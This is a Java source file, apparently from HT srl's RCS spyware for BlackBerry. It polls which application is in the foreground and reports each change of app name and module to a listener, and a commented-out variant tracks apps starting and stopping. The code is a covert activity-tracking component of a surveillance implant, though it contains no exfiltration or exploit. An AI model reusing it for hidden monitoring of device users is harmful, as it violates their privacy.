//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppUpdateManager.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import java.util.TimerTask;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class AppUpdateManager.
 */
public final class AppUpdateManager extends TimerTask {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppUpdManager", DebugLevel.VERBOSE);
    //#endif
    ApplicationManager manager = ApplicationManager.getApplicationManager();
    //Hashtable appSet = new Hashtable();
    AppListener appListener = AppListener.getInstance();

    boolean running;

    boolean windowName = false;
    String lastName, lastMod;
    
    // questo e' solo di ottimizzazione
    int lastForegroundId;

    public AppUpdateManager() {

    }

    public AppUpdateManager(AppUpdateManager appManager) {
        lastName = appManager.lastName;
        lastMod = appManager.lastMod;
    }

    public boolean isRunning() {
        return running;
    }

    Object syncAppobj = new Object();
    public void run() {
        synchronized (syncAppobj) {
            if (running) {
                return;
            } else {
                running = true;
            }
        }

        try {

            final int foregroundId = manager
                    .getForegroundProcessId();
            
            if(lastForegroundId == foregroundId){
            	return;
            }
            
            lastForegroundId = foregroundId;
            final ApplicationDescriptor[] descriptors = manager
                    .getVisibleApplications();
            
            // Retrieve the name of running applications.
            for (int i = 0; i < descriptors.length; i++) {
                final ApplicationDescriptor descriptor = descriptors[i];

                // find which one is in foreground
                final int pid = ApplicationManager.getApplicationManager()
                        .getProcessId(descriptor);
                if (pid == foregroundId) {

                    final String name = descriptor.getName();
                    final String mod = descriptor.getModuleName();

                    if (!name.equals(lastName) || !mod.equals(lastMod)) {

                        appListener.applicationForegroundChange(name, lastName,
                                mod, lastMod);

                        lastName = name;
                        lastMod = mod;
                        break;
                    }
                }
            }

        } finally {
            synchronized (syncAppobj) {
                running = false;
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see java.util.TimerTask#run()
     */
    /*
     * public void runMulti() { synchronized (this) { if (running) { return; }
     * else { running = true; } } try { final Hashtable newSet = new
     * Hashtable(); final Vector startedListName = new Vector(); final Vector
     * stoppedListName = new Vector(); final Vector startedListMod = new
     * Vector(); final Vector stoppedListMod = new Vector(); boolean haveChanges
     * = false; // Check to see if application is running. final
     * ApplicationDescriptor[] descriptors = manager .getVisibleApplications();
     * // Retrieve the name of a running application. for (int i = 0; i <
     * descriptors.length; i++) { final ApplicationDescriptor descriptor =
     * descriptors[i]; newSet.put(descriptor, ""); if
     * (appSet.containsKey(descriptor)) { // tolgo gli elementi gia' presenti.
     * appSet.remove(descriptor); } else { //#ifdef DEBUG
     * debug.trace("Started: " + descriptor.getName()); //#endif
     * startedListName.addElement(descriptor.getName());
     * startedListMod.addElement(descriptor.getModuleName()); haveChanges =
     * true; } } // appList contiene gli elementi stoppati final Enumeration
     * stopped = appSet.keys(); while (stopped.hasMoreElements()) { final
     * ApplicationDescriptor descriptor = (ApplicationDescriptor) stopped
     * .nextElement(); stoppedListName.addElement(descriptor.getName());
     * stoppedListMod.addElement(descriptor.getModuleName()); //#ifdef DEBUG
     * final String appName = descriptor.getName(); debug.trace("Stopped: " +
     * appName); //#endif } appSet = newSet; if (!stoppedListName.isEmpty()) {
     * //#ifdef DBC Check.asserts(stoppedListName.size() ==
     * stoppedListMod.size(), "different stoppedList size"); //#endif
     * haveChanges = true; } if (haveChanges) { //#ifdef DEBUG
     * debug.trace("haveChanges"); //#endif
     * appListener.applicationListChange(startedListName, stoppedListName,
     * startedListMod, stoppedListMod); appSet = newSet; } } finally {
     * synchronized (this) { running = false; } } }
     */

}
